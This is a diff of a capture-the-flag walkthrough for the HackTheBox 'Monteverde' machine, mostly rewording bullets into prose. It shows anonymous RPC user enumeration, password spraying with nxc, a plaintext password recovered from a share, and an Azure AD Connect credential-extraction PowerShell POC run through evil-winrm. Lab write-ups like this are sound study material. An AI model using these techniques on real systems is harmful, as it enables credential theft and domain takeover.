@@ -64,8 +64,7 @@ OS and Service detection performed. Please report any incorrect results at https
 # Nmap done at Fri Aug 21 15:42:48 2026 -- 1 IP address (1 host up) scanned in 166.64 seconds
 ```
 
-- Rcp - anonymous bind
-- ldap - anonymous bind
+Rpc and ldap both allow anonymous bind. Using `rpcclient` we can enumerate the domain users:
 
 ```sh
 rpcclient -N -U "" 10.129.228.111
@@ -100,7 +99,7 @@ roleary
 smorgan
 ```
 
-- Got usernames (couldn't run nxc due to timeout errors extracting information)
+Got usernames (couldn't run nxc due to timeout errors extracting information):
 
 ```powershell
 rpcclient $> queryuser AAD_987d7f2f57d2
@@ -133,20 +132,17 @@ rpcclient $> queryuser AAD_987d7f2f57d2
 
 ```
 
-We found the Service account for the **Synchronization service**
-
-The above can also be done with `enum4linux`:
+We found the Service account for the **Synchronization service**. The above can also be done with `enum4linux`:
 
 ```sh
 enum4linux -a 10.129.228.111
 ```
 
-Here we noticed **Account Lockout Threshold : None**
+Here we noticed **Account Lockout Threshold : None**.
 
 # User
 
-- Password spraying with `nxc`:
-	- Can be done on both smb and ldap
+Password spraying with `nxc` can be done on both smb and ldap:
 
 ```sh
 nxc smb 10.129.228.111 -u users.txt -p users.txt --no-bruteforce
@@ -154,15 +150,13 @@ nxc smb 10.129.228.111 -u users.txt -p users.txt --no-bruteforce
 SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
 ```
 
-Used creds to view the shares but nxc failed due to connection time error:
-
-- So we used `smbmap` for listing directories:
+Used creds to view the shares but nxc failed due to connection time error, so we used `smbmap` for listing directories:
 
 ```sh
 smbmap -u 'SABatchJobs' -p 'SABatchJobs' -H 10.129.228.111
 ```
 
-- The `user$` share seems interesting:
+The `user$` share seems interesting:
 
 ```sh
 smbclient //10.129.228.111/users$ -U SABatchJobs
@@ -212,7 +206,7 @@ Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential
 </Objs>
 ```
 
-- The **mhope** user directory holds a file which revealed the plaintext password:
+The **mhope** user directory holds a file which revealed the plaintext password:
 
 > `mhope - 4n0therD4y@n0th3r$`
 
@@ -230,7 +224,7 @@ According to Microsoft documentation, the ADSync service is responsible for sync
 > reference :
 > https://learn.microsoft.com/en-us/answers/questions/2201891/microsoft-azure-ad-sync-service-not-showing-in-ser
 
-- We can enumerate the service instance using the Registry:
+We can enumerate the service instance using the Registry:
 
 ```powershell
 *Evil-WinRM* PS C:\Users\mhope\Documents> Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync
@@ -251,15 +245,11 @@ ProductVersion : 1.1.882.0
 
 ### New Version
 
-- Searching online reveals the **adconnectdump tool**, which can extract the password for the **AD Connect Sync Account**:
+Searching online reveals the **adconnectdump tool**, which can extract the password for the **AD Connect Sync Account**:
 
 > link : https://github.com/dirkjanm/adconnectdump
 
-- The repo mentions that the way AD connect stores credentials changed a while back.
-
-- The new version stores credentials using DPAPI and the old version used the Registry.
-- The current version of AD Connect at the time of writing is 1.5.30.0, so the version on the server is unlikely to use DPAPI.
-- This tool works for newer versions of AD Connect that use DPAPI.
+The repo mentions that the way AD connect stores credentials changed a while back. The new version stores credentials using DPAPI and the old version used the Registry. The current version of AD Connect at the time of writing is 1.5.30.0, so the version on the server is unlikely to use DPAPI. This tool works for newer versions of AD Connect that use DPAPI.
 
 ### Older version
 
@@ -283,9 +273,7 @@ Some further searching reveals this blog post, which is recommended reading. It 
 
 > Note: **dll files** are known as **assemblies**
 
-- `Microsoft.Online.PasswordSynchronization.dll` -> responsible for handling the **synchronisation of password hashes**
-
-- This assembly can be found within the default installation path of Azure AD Sync `C:\Program Files\Microsoft Azure AD Sync\Bin`.
+`Microsoft.Online.PasswordSynchronization.dll` -> responsible for handling the **synchronisation of password hashes**. This assembly can be found within the default installation path of Azure AD Sync `C:\Program Files\Microsoft Azure AD Sync\Bin`.
 
 **DRS** (Directory Replication Services) prefixes a number of API's which facilitate the **replication of objects** between domain controllers.
 
@@ -296,27 +284,20 @@ So what we're actually seeing is how Azure AD Connect **retrieve data** from Act
 
 > Well as we know, **to perform a DCSync via Mimikatz**, an account must possess the "Replicating Directory Changes" **permission** within AD.
 
-We can see that a new user is created during the installation of Azure AD Connect with the username `MSOL_[HEX]`
-- reviewing its permissions, we see what we'd expect of an account tasked with **replicating AD**
+We can see that a new user is created during the installation of Azure AD Connect with the username `MSOL_[HEX]`. Reviewing its permissions, we see what we'd expect of an account tasked with **replicating AD**.
 
 
 By default when deploying the connector a new database is created on the host using SQL Server's LOCALDB.
 
 To view information on the running instance, use the installed `SqlLocalDb.exe` tool.
 
-- The database supports the Azure AD Sync service by storing metadata and configuration data for the service.
+The database supports the Azure AD Sync service by storing metadata and configuration data for the service.
 
-Table named `mms_management_agent` which contains a number of fields including `private_configuration_xml`.
-- The XML within this field holds details regarding the `MSOL` user
-- The password is omitted from the XML returned
-- The encrypted password is actually stored within another field, `encrypted_configuration`
+There's a table named `mms_management_agent` which contains a number of fields including `private_configuration_xml`. The XML within this field holds details regarding the `MSOL` user, but the password is omitted from the XML returned — the encrypted password is actually stored within another field, `encrypted_configuration`.
 
-Looking through the handling of this encrypted data within the connector service:
-- we see references to an assembly `C:\Program Files\Microsoft Azure AD Sync\Binn\mcrypt.dll`
-- which is responsible for **key management** and the **decryption** of this data
+Looking through the handling of this encrypted data within the connector service, we see references to an assembly `C:\Program Files\Microsoft Azure AD Sync\Binn\mcrypt.dll` which is responsible for **key management** and the **decryption** of this data.
 
-To decrypt the `encrypted_configuration` value:
-- a quick POC which retrieves the keying material from the LocalDB instance before passing it to the `mcrypt.dll` assembly to decrypt:
+To decrypt the `encrypted_configuration` value, a quick POC retrieves the keying material from the LocalDB instance before passing it to the `mcrypt.dll` assembly to decrypt:
 
 ```powershell
 Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"
@@ -362,8 +343,8 @@ Write-Host ("Password: " + $password.Password)
 When executed, the decrypted password for the MSOL account is revealed.
 
 Requirements:
-To complete this exfiltration of credentials:
-- Need access to the LocalDB (if configured to use this DB), which by default holds the following security configuration
+
+To complete this exfiltration of credentials, you need access to the LocalDB (if configured to use this DB), which by default holds the following security configuration
 
 This means that if you are able to compromise a server containing the **Azure AD Connect service**, and gain access to either the **ADSyncAdmins** or **local Administrators groups**, you have the ability to retrieve the credentials for an account capable of performing a DCSync.
 
@@ -389,7 +370,7 @@ Three values to proceed with the attack:
 - entropy
 ```
 
-- `sqlcmd` to fetch info from the **ADsync table** on the **MONTEVERDE server**:
+Use `sqlcmd` to fetch info from the **ADsync table** on the **MONTEVERDE server**:
 
 ```powershell
 sqlcmd -S MONTEVERDE -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"
@@ -457,13 +438,13 @@ Write-Host ("Password: " + $password.Password)
 evil-winrm -i 10.129.228.111 -u 'mhope' -p '4n0therD4y@n0th3r$' -s .
 ```
 
-- `-s` -> used to specify a **script directory path** that contains PowerShell scripts you want to **load** and use during the WinRM session.
+The `-s` flag is used to specify a **script directory path** that contains PowerShell scripts you want to **load** and use during the WinRM session.
 
 ```powershell
 *Evil-WinRM* PS C:\Users\mhope\Documents> adconnect.ps1
 ```
 
-- execute the script and call the function:
+Execute the script and call the function:
 
 ```powershell
 *Evil-WinRM* PS C:\Users\mhope\Documents> Get-ADconnectPassword
